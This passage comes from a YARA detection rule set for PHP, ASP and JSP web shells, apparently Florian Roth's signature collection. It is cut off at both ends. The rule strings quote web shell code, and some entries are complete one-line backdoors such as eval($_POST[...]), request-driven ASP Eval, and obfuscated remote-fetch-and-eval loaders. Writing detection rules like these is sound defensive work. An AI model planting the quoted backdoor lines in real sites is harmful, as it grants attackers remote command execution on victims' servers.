\\\"user=\\\".@get_current_user().\\\" uid=\\\".@getmyuid().\\\" gid=\\\".@getmygid()\" \n   condition: \n      2 of them\n}\n\nrule Webshell_c99shell_v1_0_99_RID2FF9 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:20:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3ca5886cd54d495dc95793579611f59a\"\n      hash2 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash3 = \"d8ae5819a0a2349ec552cbcf3a62c975\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"c99ftpbrutecheck\" \n      $s1 = \"$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);\" fullword\n      $s2 = \"$fqb_lenght = $nixpwdperpage;\" fullword\n      $s3 = \"$sock = @ftp_connect($host,$port,$timeout);\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_SpecialShell_99d_RID3094 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash2 = \"d8ae5819a0a2349ec552cbcf3a62c975\"\n      hash3 = \"9e9ae0332ada9c3797d6cee92c2ede62\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$sqlquicklaunch[] = array(\\\"\" \n      $s1 = \"else {echo \\\"<center><b>File does not exists (\\\".htmlspecialchars($d.$f).\\\")!<\" \n   condition: \n      all of them\n}\n\nrule Webshell_Fatalshell_php_RID304D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b15583f4eaad10a25ef53ab451a4a26d\"\n      hash2 = \"ab9c6b24ca15f4a1b7086cad78ff0f78\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(@$_POST['save'])writef($file,$_POST['data']);\" fullword\n      $s1 = \"if($action==\\\"phpeval\\\"){\" fullword\n      $s2 = \"$uploadfile = $dirupload.\\\"/\\\".$_POST['filename'];\" fullword\n      $s3 = \"$dir=getcwd().\\\"/\\\";\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_c99shell_v1_0_SsEs_RID3105 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9e9ae0332ada9c3797d6cee92c2ede62\"\n      hash2 = \"6cd50a14ea0da0df6a246a60c8f6f9c9\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"if (!empty($delerr)) {echo \\\"<b>Deleting with errors:</b><br>\\\".$delerr;}\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_Crystal_php_nshell_RID3214 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4a44d82da21438e32d4f514ab35c26b6\"\n      hash2 = \"0c5d227f4aa76785e4760cdcff78a661\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if ($filename != \\\".\\\" and $filename != \\\"..\\\"){\" fullword\n      $s1 = \"$dires = $dires . $directory;\" fullword\n      $s4 = \"$arr = array_merge($arr, glob(\\\"*\\\"));\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_nst_php_cybershell_RID322E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:54:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ef8828e0bc0641a655de3932199c0527\"\n      hash2 = \"17a07bb84e137b8aa60f87cd6bfab748\"\n      hash3 = \"4745d510fed4378e4b1730f56f25e569\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@$rto=$_POST['rto'];\" fullword\n      $s2 = \"SCROLLBAR-TRACK-COLOR: #91AAFF\" fullword\n      $s3 = \"$to1=str_replace(\\\"//\\\",\\\"/\\\",$to1);\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_c99_generic2_RID2EE9 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated \"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:34:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3ca5886cd54d495dc95793579611f59a\"\n      hash2 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash3 = \"433706fdc539238803fd47c4394b5109\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \" if ($mode & 0x200) {$world[\\\"execute\\\"] = ($world[\\\"execute\\\"] == \\\"x\\\")?\\\"t\\\":\" \n      $s1 = \" $group[\\\"execute\\\"] = ($mode & 00010)?\\\"x\\\":\\\"-\\\";\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_c99shell_v1_PHP_RID2FE0 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:15:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9e9ae0332ada9c3797d6cee92c2ede62\"\n      hash2 = \"44542e5c3e9790815c49d5f9beffbbf2\"\n      hash3 = \"d089e7168373a0634e1ac18c0ee00085\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$result = mysql_query(\\\"SHOW PROCESSLIST\\\", $sql_sock); \" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_multiple_php_webshells_2_RID3472 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated \"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:30:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3ca5886cd54d495dc95793579611f59a\"\n      hash2 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash3 = \"d8ae5819a0a2349ec552cbcf3a62c975\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"elseif (!empty($ft)) {echo \\\"<center><b>Manually selected type is incorrect. I\" \n      $s1 = \"else {echo \\\"<center><b>Unknown extension (\\\".$ext.\\\"), please, select type ma\" \n      $s3 = \"$s = \\\"!^(\\\".implode(\\\"|\\\",$tmp).\\\")$!i\\\";\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_SpecialShell_99_php_php_a_RID343E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:22:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3ca5886cd54d495dc95793579611f59a\"\n      hash2 = \"9c5bb5e3a46ec28039e8986324e42792\"\n      hash3 = \"44542e5c3e9790815c49d5f9beffbbf2\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if ($total === FALSE) {$total = 0;}\" fullword\n      $s1 = \"$free_percent = round(100/($total/$free),2);\" fullword\n      $s2 = \"if (!$bool) {$bool = is_dir($letter.\\\":\\\\\\\\\\\");}\" fullword\n      $s3 = \"$bool = $isdiskette = in_array($letter,$safemode_diskettes);\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_r577_php_spy_2_RID2FAE : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"eddf7a8fde1e50a7f2a817ef7cece24f\"\n      hash2 = \"eed14de3907c9aa2550d95550d1a2d5f\"\n      hash3 = \"817671e1bdc85e04cc3440bbd9288800\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$res = mssql_query(\\\"select * from r57_temp_table\\\",$db);\" fullword\n      $s2 = \"'eng_text30'=>'Cat file',\" fullword\n      $s3 = \"@mssql_query(\\\"drop table r57_temp_table\\\",$db);\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_c99php_NIX_REMOTE_WEB_SHELL_RID3350 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files nixrem.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:42:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d8ae5819a0a2349ec552cbcf3a62c975\"\n      hash2 = \"9e9ae0332ada9c3797d6cee92c2ede62\"\n      hash3 = \"f3ca29b7999643507081caab926e2e74\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$num = $nixpasswd + $nixpwdperpage;\" fullword\n      $s1 = \"$ret = posix_kill($pid,$sig);\" fullword\n      $s2 = \"if ($uid) {echo join(\\\":\\\",$uid).\\\"<br>\\\";}\" fullword\n      $s3 = \"$i = $nixpasswd;\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_webshells_new_con2_RID31E9 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file con2.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:42:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e\" \n      $s10 = \"j \\\"<Form action='\\\"&URL&\\\"?Action2=Post' method='post' name='EditForm'><input n\" \n   condition: \n      1 of them\n}\n\nrule Webshell_webshells_new_make2_RID3247 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file make2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:58:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"error_reporting(0);session_start();header(\\\"Content-type:text/html;charset=utf-8\" \n   condition: \n      all of them\n}\n\nrule Webshell_webshells_new_php2_RID31F1 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file php2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:44:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php $s=@$_GET[2];if(md5($s.$s)==\" \n   condition: \n      all of them\n}\n\nrule Webshell_bypass_iisuser_p_RID316A : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file bypass-iisuser-p.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:21:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%Eval(Request(chr(112))):Set fso=CreateObject\" \n   condition: \n      all of them\n}\n\nrule Webshell_webshells_new_pppp_RID3237 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file pppp.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:55:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Mail: chinese@hackermail.com\" fullword\n      $s3 = \"if($_GET[\\\"hackers\\\"]==\\\"2b\\\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \" \n      $s6 = \"Site: http://blog.weili.me\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_webshells_new_jspyyy_RID332F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file jspyyy.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 14:37:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@page import=\\\"java.io.*\\\"%><%if(request.getParameter(\\\"f\\\")\" \n   condition: \n      all of them\n}\n\nrule Webshell_webshells_new_xxxx_RID3257 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file xxxx.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 14:01:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php eval($_POST[1]);?>  \" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_webshells_new_JJjsp3_RID328B : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file JJjsp3.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 14:09:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@page import=\\\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\\\"%><%!S\" \n   condition: \n      all of them\n}\n\nrule Webshell_webshells_new_radhat_RID32EB : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file radhat.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 14:25:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sod=Array(\\\"D\\\",\\\"7\\\",\\\"S\" \n   condition: \n      all of them\n}\n\nrule Webshell_webshells_new_asp1_RID31EC : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file asp1.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:43:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \" http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave \" fullword\n      $s2 = \" <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_webshells_new_php6_RID31F5 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file php6.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:44:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"array_map(\\\"asx73ert\\\",(ar\" \n      $s3 = \"preg_replace(\\\"/[errorpage]/e\\\",$page,\\\"saft\\\");\" fullword\n      $s4 = \"shell.php?qid=zxexp  \" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_webshells_new_xxx_RID31DF : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file xxx.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:41:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<?php array_map(\\\"ass\\\\x65rt\\\",(array)$_REQUEST['expdoor']);?>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_GetPostpHp_RID2E94 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file GetPostpHp.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 11:20:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_webshells_new_php5_RID31F4 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file php5.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:44:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u\" \n   condition: \n      all of them\n}\n\nrule Webshell_webshells_new_aaa_RID319A : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file aaa.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:29:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Function fvm(jwv):If jwv=\\\"\\\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\\\"\" \n      $s5 = \"<option value=\\\"\\\"DROP TABLE [jnc];exec mast\\\"&kvp&\\\"er..xp_regwrite 'HKEY_LOCAL\" \n      $s17 = \"if qpv=\\\"\\\" then qpv=\\\"x:\\\\Program Files\\\\MySQL\\\\MySQL Server 5.0\\\\my.ini\\\"&br&\" \n   condition: \n      1 of them\n}\n\nrule Webshell_Expdoor_com_ASP_RID3068 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file Expdoor.com ASP.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 12:38:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"\\\">www.Expdoor.com</a>\" fullword\n      $s5 = \"    <input name=\\\"FileName\\\" type=\\\"text\\\" value=\\\"Asp_ver.Asp\\\" size=\\\"20\\\" max\" \n      $s10 = \"set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '\" fullword\n      $s14 = \"set fs=server.CreateObject(\\\"Scripting.FileSystemObject\\\")   '\" fullword\n      $s16 = \"<TITLE>Expdoor.com ASP\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_sig_404super_RID2F0F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file 404super.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 11:41:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"$i = pack('c*', 0x70, 0x61, 99, 107);\" fullword\n      $s6 = \"    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631'),\" fullword\n      $s7 = \"//http://require.duapp.com/session.php\" fullword\n      $s8 = \"if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}\" fullword\n      $s12 = \"//define('pass','123456');\" fullword\n      $s13 = \"$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO\" \n   condition: \n      1 of them\n}\n\nrule Webshell_webshells_new_JSP_RID3164 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file JSP.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:20:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i\" \n      $s5 = \"bw.write(z2);bw.close();sb.append(\\\"1\\\");}else if(Z.equals(\\\"E\\\")){EE(z1);sb.app\" \n      $s11 = \"if(Z.equals(\\\"A\\\")){String s=new File(application.getRealPath(request.getRequest\" \n   condition: \n      1 of them\n}\n\nrule Webshell_dev_core_RID2DED : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file dev_core.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 10:52:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {\" fullword\n      $s9 = \"setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);\" fullword\n      $s10 = \"$_SESSION['code'] = _REQUEST(sprintf(\\\"%s?%s\\\",pack(\\\"H*\\\",'6874\" \n      $s11 = \"if (preg_match(\\\"/^HTTP\\\\/\\\\d\\\\.\\\\d\\\\s([\\\\d]+)\\\\s.*$/\\\", $status, $matches))\" \n      $s12 = \"eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C\" \n      $s15 = \"if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))\" \n   condition: \n      1 of them\n}\n\nrule Webshell_webshells_new_pHp_RID319F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file pHp.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:30:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(is_readable($path)) antivirus($path.'/',$exs,$matches);\" fullword\n      $s1 = \"'/(eval|assert|include|require|include\\\\_once|require\\\\_once|array\\\\_map|arr\" \n      $s13 = \"'/(exec|shell\\\\_exec|system|passthru)+\\\\s*\\\\(\\\\s*\\\\$\\\\_(\\\\w+)\\\\[(.*)\\\\]\\\\s*\" \n      $s14 = \"'/(include|require|include\\\\_once|require\\\\_once)+\\\\s*\\\\(\\\\s*[\\\\'|\\\\\\\"](\\\\w+\" \n      $s19 = \"'/\\\\$\\\\_(\\\\w+)(.*)(eval|assert|include|require|include\\\\_once|require\\\\_once\" \n   condition: \n      1 of them\n}\n\nrule Webshell_webshells_new_code_RID3212 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file code.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:49:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<a class=\\\"high2\\\" href=\\\"javascript:;;;\\\" name=\\\"action=show&dir=$_ipage_fi\" \n      $s7 = \"$file = !empty($_POST[\\\"dir\\\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO\" \n      $s10 = \"if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_\" \n      $s14 = \"Processed in <span id=\\\"runtime\\\"></span> second(s) {gzip} usage:\" \n      $s17 = \"<a href=\\\"javascript:;;;\\\" name=\\\"{return_link}\\\" onclick=\\\"fileperm\" \n   condition: \n      1 of them\n}\n\nrule Webshell_webshells_new_PHP1_RID3190 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file PHP1.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:27:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>\" fullword\n      $s2 = \":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316\" fullword\n      $s3 = \"@preg_replace(\\\"/f/e\\\",$_GET['u'],\\\"fengjiao\\\"); \" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_webshells_new_JJJsp2_RID326A : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file JJJsp2.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 14:04:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"QQ(cs, z1, z2, sb,z2.indexOf(\\\"-to:\\\")!=-1?z2.substring(z2.indexOf(\\\"-to:\\\")+4,z\" \n      $s8 = 